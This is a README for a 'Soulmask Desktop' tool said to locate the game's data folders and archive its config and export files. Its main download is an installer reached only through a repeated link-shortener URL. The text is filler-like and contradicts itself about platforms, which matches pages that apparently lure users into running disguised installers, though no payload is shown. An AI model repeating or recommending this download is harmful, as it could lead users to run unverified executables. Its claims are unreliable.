![Soulmask Desktop](assets/hero.png)

# Soulmask Desktop

*Find the Soulmask folder fast and keep a local spare.*

## What Soulmask Desktop is

**Soulmask Desktop** is a Windows utility. Local Windows and macOS helper for Soulmask data paths, config and export caches, and export folders.

Soulmask drops data files next to launcher caches.

The CLI in this repository is the documented interface; the desktop build is the same job in an installer.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## What it does

- Finds the Soulmask data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## The problem

People search Soulmask desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/marcuspatterson24/soulmask-desktop

MIT license. See `LICENSE`.
